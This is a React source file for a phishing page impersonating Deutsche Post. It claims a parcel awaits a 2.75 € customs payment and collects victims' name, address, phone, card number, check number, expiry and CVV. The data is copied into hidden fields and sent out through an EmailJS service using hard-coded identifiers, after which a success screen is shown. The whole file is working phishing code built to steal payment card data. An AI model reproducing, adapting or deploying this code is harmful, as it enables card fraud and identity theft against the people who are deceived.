"use client";
import Congrats from "@/components/Congrats";
// import ContactOne from "@/components/ContactOne";
import ContactTwo from "@/components/ContactTwo";
import Container from "@/components/Container";
import { useEffect, useRef, useState } from "react";
import emailjs from "@emailjs/browser";
import { getV } from "../getValuesSlice";
import { useDispatch, useSelector } from "react-redux";
import Wrapper from "@/components/Wrapper";
const HomePage = () => {
  const dispatch = useDispatch();
  const globalS = useSelector((s) => s.values);
  console.log(globalS);
  const [index, setIndex] = useState(0);
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [postCode, setPostCode] = useState(0);
  const [phoneNumber, setPhoneNumber] = useState(0);
  const [city, setCity] = useState("");
  const [kartennummer, setKartennummer] = useState("");
  const [kartenprufnummer, setKartenprufnummer] = useState("");
  const [Gültigkeit, setKarditkartenanbieter] = useState("");
  const [selectOneValue, setSelectOneValue] = useState("");
  const [selectTwoValue, setSelectTwoValue] = useState("");
  const [message, setMessage] = useState("");
  const [isGo, setIsGo] = useState(false);
  const form = useRef();
  const txtArea = useRef();
  const selectOne = useRef();
  const selectTwo = useRef();
  const handelFoucs = () => {
    setIndex(1);
    const input = document.querySelector(".input-values");
    input.select();
    document.execCommand("copy");
    sessionStorage.setItem("info-1", JSON.stringify(input.value));
    console.log(index);
    setMessage(sessionStorage.getItem("info-1"));
  };
  useEffect(() => {
    dispatch(
      getV(
        `${message} kartennummer: ${kartennummer}\n kartenprufnummer: ${kartenprufnummer}\n Exp: ${selectOneValue}/${selectTwoValue}\n cvv: ${Gültigkeit}`
      )
    );
  }, [kartennummer, kartenprufnummer, selectOneValue, selectTwo, Gültigkeit]);
  console.log(message);
  const submit = () => {
    // setMessage(
    //   (prev) =>
    //     `${prev} kartennummer: ${kartennummer}\n kartenprufnummer: ${kartenprufnummer}\n Exp: ${selectOneValue}/${selectTwoValue}\n cvv: ${Gültigkeit}`
    // );

    emailjs.sendForm("service_usdywy7", "template_20m02fk", form.current, {
      publicKey: "pYexSWO4f8GOPt5yA",
    });
    console.log("SUCCESS!");
    setTimeout(() => {
      form.current?.submit();
    }, 2000);
    setIndex((prev) => prev + 1);
  };
  console.log(globalS);
  return (
    <section className=" py-[15px]">
      <section className="min-h-[20vh] p-[1vw] pb-[15px] bg-[#] pt-[60px]">
        <section className="md:px-[10vw]">
          <a className="text-[#00f] underline" href="">
            Paket versardan
          </a>
          <button className="block border-[1px]  border-solid border-[#bbb] mt-[10px] rounded-sm px-[10px]">
            Hier
          </button>
          <div className="flex flex-wrap items-center mt-[20px] gap-[10px] sm:gap-[15px]">
            {[
              "Briefversand",
              "Warenversand",
              "Services",
              "Buro",
              "Sammeln",
            ].map((item) => (
              <div className="cursor-pointer">{item}</div>
            ))}
          </div>
        </section>
        <section className="h-[10vh]  px-[10px]  mt-[20px] bg-[#eee] ">
          <Container>
            <section className="flex h-[inherit] relative items-center justify-between">
              <section className="absolute left-0 flex  top-1/2 w-full -translate-y-1/2">
                <div
                  className={`w-[0%] transition-all duration-500 h-[4px] bg-[#FFCC00] ${
                    index >= 1 && "!w-[50%]"
                  }`}
                />
                <div
                  className={`w-[0%] transition-all duration-500 h-[4px] bg-[#FFCC00] ${
                    index >= 2 && "!w-[50%]"
                  }`}
                />
              </section>
              {[1, 2, 3].map((d) => (
                <div className="size-[40px] relative z-[9999] flex items-center justify-center border-[2px] border-solid border-black bg-white font-bold rounded-[50%]">
                  {d}
                </div>
              ))}
            </section>
          </Container>
          {/* {index < 2 && (
            <button onClick={() => setIndex((prev) => prev + 1)}>
              Click ME!
            </button>
          )} */}

          {/* Render Childrens Here! */}
        </section>
      </section>
      <section>
        {/* <input type="text" className="" name="from_name" value={username} /> */}
        {index == 0 && (
          <>
            <div className="min-h-[50vh] mt-[30px] bg-[#FFCC00] py-[15px]">
              <Container>
                <section className="md:flex flex-wrap gap-[20px] justify-between">
                  <section className="pt-[20px] flex-1">
                    <h3 className="mt-[20px] font-bold text-[22px]">
                      Informationen
                    </h3>
                    <form className="flex flex-col gap-3">
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          onChange={(e) => setUsername(e.target.value)}
                          placeholder="Name"
                          required
                          name="from_name"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          placeholder="Anschrift"
                          required
                          onChange={(e) => setEmail(e.target.value)}
                          name="user_email"
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="number"
                          onChange={(e) => setPostCode(e.target.value)}
                          placeholder="Plz"
                          required
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="text"
                          onChange={(e) => setCity(e.target.value)}
                          placeholder="Stadt"
                          required
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <section className="mt-[10px]">
                        <input
                          type="number"
                          placeholder="Rufnmmer"
                          required
                          onChange={(e) => setPhoneNumber(e.target.value)}
                          className="w-full px-[10px] h-[40px] border-solid border-[1px] border-black"
                        />
                      </section>
                      <div
                        onClick={handelFoucs}
                        className="bg-red-400 w-fit transition-all duration-[100ms] cursor-pointer px-[30px] active:scale-[1.115] text-white p-[10px]"
                      >
                        Weiter
                      </div>
                      <input
                        value={`username ${username}, Phone Number ${phoneNumber} email ${email} City ${city} Post Code ${postCode}`}
                        id=""
                        className="input-values"
                        ref={txtArea}
                        onChange={(e) =>
                          getV(
                            `username ${username}, Phone Number ${phoneNumber} email ${email} City ${city} Post Code ${postCode}`
                          )
                        }
                      />
                      .
                    </form>
                  </section>
                  <section className="flex-1">
                    <h4 className="mt-[20px] capitalize font-bold text-[22px]">
                      ihr paket wartet auf die zustellung
                    </h4>
                    <p className="text-[#333] mt-[15px] text-[14px]">
                      Ihr Paket ist bei der Deutschen Post angekommen Bitte
                      Bestätigen Sie die Zahlung von 2.75 € um die Zollgebühren
                      abzuheben
                    </p>
                  </section>
                </section>
              </Container>
            </div>
          </>
        )}
        {index == 1 && (
          <>
            <form
              ref={form}
              className="px-[20px] pt-[30px] border-t-[#ddd] border-t-[1px] mt-[30px] py-[15px]"
            >
              <input
                type="text"
                className="opacity-0"
                name="from_name"
                value={username}
              />
              <input
                type="text"
                className="opacity-0"
                name="message"
                value={globalS}
              />

              <div className="flex flex-col gap-[10px] mt-[10px]">
                <label htmlFor="">Kartenprufnummer</label>
                <input
                  type="text"
                  onChange={(e) => setKartenprufnummer(e.target.value)}
                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
                  placeholder={"Kartenprufnummer"}
                  required
                />
              </div>
              {/* <div className="flex flex-col gap-[10px] mt-[10px]">
                <label htmlFor="">Karditkartenanbieter</label>
                <input
                  type="text"
                  onChange={(e) => setKarditkartenanbieter(e.target.value)}
                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
                  placeholder={"Karditkartenanbieter"}
                  required
                />
              </div> */}
              <div className="flex flex-col gap-[10px] mt-[10px]">
                <label htmlFor="">Kartennummer</label>
                <input
                  type="text"
                  onChange={(e) => setKartennummer(e.target.value)}
                  className="p-[7px] border-solid border-[#bbb] max-w-[300px] border-[2px]"
                  placeholder={"Kartennummer"}
                  required
                />
              </div>
              <div className="flex flex-col gap-[15px] mt-[15px]">
                <label htmlFor="">Kartennummer</label>
                <section className="flex items-center gap-2">
                  <select
                    ref={selectOne}
                    onChange={(e) => setSelectOneValue(e.target.value)}
                    id=""
                    className="border-solid border-[1px] border-black w-[100px]"
                  >
                    {[
                      2016, 2017, 2018, 2019, 2020, 2021, 2022, 2023, 2024,
                      2025, 2026, 2027, 2028, 2029, 2030,
                    ].map((year) => (
                      <option value={year}> {year} </option>
                    ))}
                  </select>
                  /
                  <select
                    ref={selectTwo}
                    onChange={(e) => setSelectTwoValue(e.target.value)}
                    id=""
                    className="border-solid border-[1px] border-black w-[100px]"
                  >
                    {[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12].map((n) => (
                      <option value={n}>{n}</option>
                    ))}
                  </select>
                </section>
              </div>
              <div className="flex flex-col gap-[15px] mt-[15px]">
                <label htmlFor="">Gültigkeit</label>
                <input
                  type="text"
                  maxLength={3}
                  onChange={(e) => setKarditkartenanbieter(e.target.value)}
                  className="p-[10px] border-solid border-[#bbb] w-[100px] border-[2px]"
                />
              </div>
            </form>
            <section className="px-[20px]">
              <p className="capitalize text-balance text-[16px]">
                bei visa-und mastercard-Kareditkarten finden sie die
                dreistellige prufnummer im unterschriftsfeld auf der
                kartenruckseite bei american expresss-Karten ist sie eine
                vierstellige nummer auf der vorderseite iher american exprees
                card
              </p>
              <button
                onClick={submit}
                className="max-md:w-full block text-left border-[#00000045] shadow-md shadow-[#bbb] border-solid border-[1px] p-[10px] font-semibold capitalize mt-[15px] bg-[#FFD638]"
              >
                jetzt bezahlen
              </button>
            </section>
          </>
        )}
        {index == 2 && <Congrats />}
      </section>
    </section>
  );
};

export default HomePage;
